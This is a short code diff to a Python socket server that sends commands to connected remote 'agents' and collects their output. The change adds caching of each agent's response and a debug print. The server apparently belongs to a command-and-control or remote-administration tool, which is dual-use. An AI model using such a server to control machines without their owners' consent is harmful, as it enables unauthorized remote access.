@@ -13,6 +13,9 @@ PORT = 8888  # Set your port
 CLIENTS_FILE = "connected_clients.json"
 
 
+cache.set('command_responses', {})
+
+
 def load_clients():
     if not os.path.exists(CLIENTS_FILE):
         with open(CLIENTS_FILE, "w") as file:
@@ -101,10 +104,16 @@ class AgentHandler(threading.Thread):
                 self.agent_socket.send(command.encode())
                 cache.set('command', '')
                 if command.lower() == "exit":
+                    cache.set('command_responses', {})
                     break
                 response = self.agent_socket.recv(4096).decode()
-                print(
-                    f"\n{'=' * 20}\nResponse from agent {self.agent_address}:\n{response}\n{'=' * 20}\n")
+
+                responses_dict = cache.get('command_responses', {})
+                responses_dict[self.agent_id] = response
+                cache.set('command_responses', responses_dict)
+                print("CACHE:", cache.get('command_responses'))
+
+                print(f"\n{'=' * 20}\nResponse from agent {self.agent_address}:\n{response}\n{'=' * 20}\n")
         except Exception as e:
             print(
                 f"\nError communicating with agent {self.agent_address}: {e}")
